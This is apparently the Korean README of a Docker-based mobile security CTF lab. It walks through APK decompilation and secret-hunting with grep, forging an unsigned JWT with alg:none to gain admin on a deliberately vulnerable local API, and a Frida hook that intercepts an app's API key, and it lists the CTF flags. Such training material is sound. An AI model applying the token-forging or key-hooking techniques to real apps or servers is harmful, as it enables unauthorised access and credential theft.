# 모바일 보안 랩 (07_mobile_lab)

이 랩은 Android APK 정적 분석, 취약한 모바일 백엔드 API 공격, Frida 동적 분석을 실습하기 위한 환경입니다.
하드코딩 API 키 추출부터 JWT alg:none 우회 공격까지 실제 모바일 앱 취약점 패턴을 다룹니다.

---

## 요구사항

| 항목 | 최소 | 권장 |
|------|------|------|
| Docker Engine | 20.10+ | 24.x |
| Docker Compose | v2.0+ | v2.x |
| RAM | 4 GB 이상 | 8 GB |
| 운영체제 | Linux / macOS / WSL2 | Ubuntu 22.04 |

---

## 서비스 구성

| 서비스 | 이미지 | 외부 포트 | 설명 |
|--------|--------|-----------|------|
| apk_analyzer | ubuntu:22.04 | 8071 | jadx·apktool·frida 분석 도구 환경 |
| mobile_api | python:3.11-slim | 8072 | 취약한 모바일 백엔드 API (CTF) |

---

## 빠른 시작

```bash
cd labs/07_mobile_lab

# 랩 시작
docker compose up -d

# 서비스 상태 확인
docker compose ps

# 로그 확인 (도구 설치 완료까지 대기)
docker compose logs -f apk_analyzer
```

### 종료

```bash
docker compose down

# 작업 공간 볼륨까지 삭제
docker compose down -v
```

---

## 실습 시나리오

### 시나리오 1 — APK 정적 분석 (jadx, apktool 사용)

분석 컨테이너에 설치된 도구로 APK 파일을 역컴파일합니다.

```bash
# 분석 컨테이너 쉘 접속
docker exec -it apk_analyzer bash

# apktool로 APK 언패킹 (리소스·Smali 코드 추출)
apktool d /apk/<target.apk> -o /workspace/unpacked/

# 언패킹된 Smali 코드에서 민감 정보 탐색
grep -rE 'api.?key|secret|token|password' /workspace/unpacked/ --include="*.smali"
grep -rE 'http[s]?://' /workspace/unpacked/ --include="*.smali"

# jadx로 Java 소스 복원
jadx -d /workspace/jadx_out/ /apk/<target.apk>

# 복원된 Java 소스에서 하드코딩 값 탐색
grep -rE 'API_KEY|SECRET|HARDCODED' /workspace/jadx_out/ --include="*.java"
```

### 시나리오 2 — 취약한 API 서버 대상 인증 우회

모바일 API 서버(`http://localhost:8072`)의 엔드포인트를 분석하고 인증을 우회합니다.

```bash
# API 엔드포인트 목록 확인
curl -s http://localhost:8072/

# 로그인 없이 admin 접근 시도 (예상: 거부)
curl -s http://localhost:8072/admin \
  -H "Authorization: Bearer invalid_token"

# /data 엔드포인트 탐색
curl -s http://localhost:8072/data
```

### 시나리오 3 — 하드코딩 API 키 추출 CTF

APK 또는 API 응답을 통해 하드코딩된 API 키를 발견하고 첫 번째 플래그를 획득합니다.

```bash
# API 키 힌트: APK 소스 또는 네트워크 트래픽 분석에서 발견

# 발견한 API 키로 로그인
curl -s -X POST http://localhost:8072/login \
  -H "Content-Type: application/json" \
  -d '{"api_key": "<discovered_api_key>"}'

# 응답에서 JWT 토큰 및 FLAG_1 확인
```

**획득 가능한 플래그 1**: `CTF{hardcoded_api_key_in_apk}`

### 시나리오 4 — JWT 취약점 (alg:none) 공격

획득한 JWT 토큰을 조작하여 alg:none 우회로 admin 권한을 취득합니다.

```bash
# 1. 시나리오 3에서 얻은 JWT 토큰 분석
# JWT 구조: header.payload.signature (Base64url 인코딩)

# 2. 헤더 디코드 (Python)
python3 -c "
import base64, json
token = '<your_jwt_token>'
header = token.split('.')[0]
# Base64 패딩 보정
padded = header + '=' * (4 - len(header) % 4)
print(json.loads(base64.b64decode(padded)))
"

# 3. alg:none 토큰 직접 조작
python3 -c "
import base64, json

# 새 헤더: alg를 'none'으로 변경
new_header = base64.b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()).decode().rstrip('=')

# 새 페이로드: role을 'admin'으로 변경
new_payload = base64.b64encode(json.dumps({'user': 'attacker', 'role': 'admin'}).encode()).decode().rstrip('=')

# alg:none 토큰 (서명 없음)
token_none = f'{new_header}.{new_payload}.'
print('Token:', token_none)
"

# 4. 조작된 토큰으로 admin 엔드포인트 접근
curl -s http://localhost:8072/admin \
  -H "Authorization: Bearer <crafted_token>"
```

**획득 가능한 플래그 2**: `CTF{jwt_alg_none_bypass}`

---

## 챌린지 힌트

| 챌린지 | 힌트 |
|--------|------|
| API 키 찾기 | APK 내 `BuildConfig`, `strings.xml`, 또는 네트워크 코드 클래스 확인 |
| JWT 디코딩 | Base64url 디코딩 시 패딩(`=`) 보정 필요 |
| alg:none 우회 | JWT 서명 제거 후 마지막 `.` 유지 (빈 서명) |
| Frida 훅 | `Java.use('com.example.app.AuthManager').getApiKey.implementation` 패턴 |

---

## Frida 동적 분석 (선택 실습)

실제 Android 기기 또는 에뮬레이터가 있을 경우 Frida로 런타임 분석을 수행합니다.

```bash
# apk_analyzer 컨테이너에서 Frida 도구 확인
docker exec -it apk_analyzer bash
frida --version
objection --version

# Frida 스크립트 예시 (API 키 후킹)
cat > /workspace/hook_apikey.js << 'EOF'
Java.perform(function() {
    var AuthClass = Java.use("com.example.app.AuthManager");
    AuthClass.getApiKey.implementation = function() {
        var result = this.getApiKey();
        console.log("[*] API Key intercepted: " + result);
        return result;
    };
});
EOF

# objection으로 앱 연결 (기기 연결 시)
objection -g com.example.app explore
```

---

## 네트워크 구성

```
[공격자 머신]
      |
  localhost:8071  →  apk_analyzer  (172.20.0.10)
  localhost:8072  →  mobile_api    (172.20.0.20)
      |
  [mobile_lab_net: 172.20.0.0/24]
```

---

## 추천 도구

| 도구 | 용도 |
|------|------|
| jadx | APK → Java 소스 역컴파일 |
| apktool | APK 언패킹 및 Smali 분석 |
| frida-tools | 런타임 후킹 및 동적 분석 |
| objection | Frida 기반 앱 탐색 프레임워크 |
| MobSF | 자동화 모바일 앱 보안 분석 (로컬 설치) |
| jwt.io | JWT 토큰 디코드/인코드 (브라우저) |

---

## 주의사항

> **경고**: 이 랩은 의도적으로 취약하게 설계되어 있습니다.
> - 로컬 또는 격리된 환경에서만 실행하세요.
> - 실습 후 반드시 `docker compose down`으로 컨테이너를 종료하세요.
> - 실제 앱에 대한 무단 분석은 법적 문제가 될 수 있습니다. 반드시 자신이 소유하거나 허가받은 앱만 분석하세요.
